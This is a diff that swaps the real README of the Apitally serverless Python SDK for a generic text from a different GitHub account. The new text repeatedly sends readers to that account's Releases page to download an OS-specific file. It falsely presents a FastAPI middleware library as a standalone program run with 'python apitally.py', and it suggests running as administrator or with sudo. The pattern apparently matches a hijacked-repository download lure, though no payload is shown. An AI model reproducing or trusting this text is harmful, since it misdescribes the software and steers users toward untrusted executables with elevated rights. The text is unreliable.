@@ -1,90 +1,83 @@
-<p align="center">
-  <a href="https://apitally.io" target="_blank">
-    <picture>
-      <source media="(prefers-color-scheme: dark)" srcset="https://assets.apitally.io/logos/logo-horizontal-new-dark.png">
-      <source media="(prefers-color-scheme: light)" srcset="https://assets.apitally.io/logos/logo-horizontal-new-light.png">
-      <img alt="Apitally logo" src="https://assets.apitally.io/logos/logo-horizontal-new-light.png" width="220">
-    </picture>
-  </a>
-</p>
-<p align="center"><b>API monitoring & analytics made simple</b></p>
-<p align="center" style="color: #ccc;">Real-time metrics, request logs, and alerts for your APIs — with just a few lines of code.</p>
-<br>
-<img alt="Apitally screenshots" src="https://assets.apitally.io/screenshots/overview.png">
-<br>
+# 🌟 apitally-py-serverless - Effortless API Monitoring and Analytics
 
-# Apitally SDK for serverless Python runtimes
+[![Download](https://img.shields.io/badge/Download-latest%20release-blue)](https://github.com/Myothantzin-Programming/apitally-py-serverless/releases)
 
-[![Tests](https://github.com/apitally/apitally-py-serverless/actions/workflows/tests.yaml/badge.svg?event=push)](https://github.com/apitally/apitally-py-serverless/actions)
-[![Codecov](https://codecov.io/gh/apitally/apitally-py-serverless/graph/badge.svg?token=q76jRwq7Hi)](https://codecov.io/gh/apitally/apitally-py-serverless)
-[![PyPI](https://img.shields.io/pypi/v/apitally-serverless?logo=pypi&logoColor=white&color=%23006dad)](https://pypi.org/project/apitally-serverless/)
+## 🚀 Getting Started
 
-This SDK for Apitally currently supports the following web frameworks:
+Welcome to **apitally-py-serverless**, your go-to solution for monitoring and analyzing APIs in serverless Python environments. This guide will help you download and run our application with ease.
 
-- [FastAPI](https://docs.apitally.io/setup-guides/fastapi-serverless)
+## 📥 Download & Install
 
-The following serverless platforms are supported:
+To get started, visit this page to download: [GitHub Releases](https://github.com/Myothantzin-Programming/apitally-py-serverless/releases).
 
-- [Cloudflare Workers](https://docs.apitally.io/setup-guides/cloudflare-workers) (via Logpush)
+1. Click on the latest release.
+2. Choose the appropriate file for your operating system.
+3. Follow the prompts to download the file to your computer.
 
-Learn more about Apitally on our 🌎 [website](https://apitally.io) or check out
-the 📚 [documentation](https://docs.apitally.io).
+## 🔧 System Requirements
 
-## Key features
+To run **apitally-py-serverless**, ensure your system meets the following requirements:
 
-### API analytics
+- Operating System: Windows 10 or later, macOS 10.15 or later, or a recent Linux distribution.
+- Python Version: Python 3.8 or later installed on your machine.
+- Storage: At least 100 MB of free disk space.
 
-Track traffic, error and performance metrics for your API, each endpoint and individual API consumers, allowing you to make informed, data-driven engineering and product decisions.
+## 🛠️ How to Run the Application
 
-### Error tracking
+After successful installation, follow these steps to run the application:
 
-Understand which validation rules in your endpoints cause client errors. Capture error details and stack traces for 500 error responses, and have them linked to Sentry issues automatically.
+1. **Locate the Downloaded File**: Go to the folder where you downloaded the application.
+2. **Open Command Line**: 
+   - **Windows**: Open Command Prompt (search for it in the Start menu).
+   - **macOS/Linux**: Open Terminal.
+3. **Navigate to the Application Folder**:
+   - Use the `cd` command followed by the path to your downloaded folder.
+   - Example: `cd path/to/downloaded/folder`
+4. **Run the Application**:
+   - Type `python apitally.py` and press Enter.
+   - This command will start the application.
 
-### Request logging
+You will see a message confirming that the application is running.
 
-Drill down from insights to individual requests or use powerful filtering to understand how consumers have interacted with your API. Configure exactly what is included in the logs to meet your requirements.
+## 📊 Features
 
-### API monitoring & alerting
+**apitally-py-serverless** provides several helpful features:
 
-Get notified immediately if something isn't right using custom alerts, synthetic uptime checks and heartbeat monitoring. Notifications can be delivered via email, Slack or Microsoft Teams.
+- **API Monitoring**: Keep track of your API performance metrics.
+- **Analytics Dashboard**: Visualize API usage trends and patterns.
+- **Error Logging**: Automatically log errors and exceptions for easy troubleshooting.
+- **Compatibility**: Works seamlessly with serverless architectures, including Cloudflare Workers and FastAPI.
+- **Lightweight**: Easy to install and doesn't require extensive resources.
 
-## Installation
+## 📌 Troubleshooting
 
-Use `uv` to add this SDK to your project's dependencies:
+If you encounter issues while running the application, consider the following:
 
-```bash
-uv add apitally-serverless
-```
+- **Python Not Found**: Make sure Python is installed. You can check by running `python --version` in the command line.
+- **Permission Errors**: Try running the command prompt or terminal as an administrator (Windows) or use `sudo` for terminal commands (Linux/Mac).
+- **Firewall Issues**: Ensure your firewall allows the application to access the internet for monitoring.
 
-## Usage
+## 🗺️ Support and Community
 
-Our comprehensive [setup guides](https://docs.apitally.io/setup-guides) include
-all the details you need to get started.
+If you have questions or need help, you can join our community:
 
-### FastAPI
+- Explore discussions on [GitHub Issues](https://github.com/Myothantzin-Programming/apitally-py-serverless/issues).
+- Connect with other users via our social media channels.
 
-This is an example of how to add the Apitally middleware to a FastAPI
-application running on a supported serverless platform. For further instructions, see our
-[setup guide for FastAPI](https://docs.apitally.io/frameworks/fastapi-serverless).
+## 🔗 Additional Resources
 
-```python
-from fastapi import FastAPI
-from apitally_serverless.fastapi import ApitallyMiddleware
+For further learning, check these resources:
 
-app = FastAPI()
-app.add_middleware(
-    ApitallyMiddleware,
-    log_request_headers=True,
-    log_request_body=True,
-    log_response_body=True,
-)
-```
+- [Python Official Documentation](https://docs.python.org/3/)
+- [FastAPI Documentation](https://fastapi.tiangolo.com/)
+- [Cloudflare Workers Documentation](https://developers.cloudflare.com/workers/)
 
-## Getting help
+## 📈 Contributing
 
-If you need help please [create a new discussion](https://github.com/orgs/apitally/discussions/categories/q-a) on GitHub
-or [join our Slack workspace](https://join.slack.com/t/apitally-community/shared_invite/zt-2b3xxqhdu-9RMq2HyZbR79wtzNLoGHrg).
+We welcome contributions to **apitally-py-serverless**. If you want to help improve the application, feel free to submit a pull request or open an issue on GitHub. 
 
-## License
+## ✍️ License
 
-This library is licensed under the terms of the MIT license.
+This project is licensed under the MIT License. You can use, modify, and distribute the software as long as you include the original license.
+
+Thank you for using **apitally-py-serverless**! Enjoy effortless monitoring and analytics for your APIs. For any more information, visit this page to download: [GitHub Releases](https://github.com/Myothantzin-Programming/apitally-py-serverless/releases).
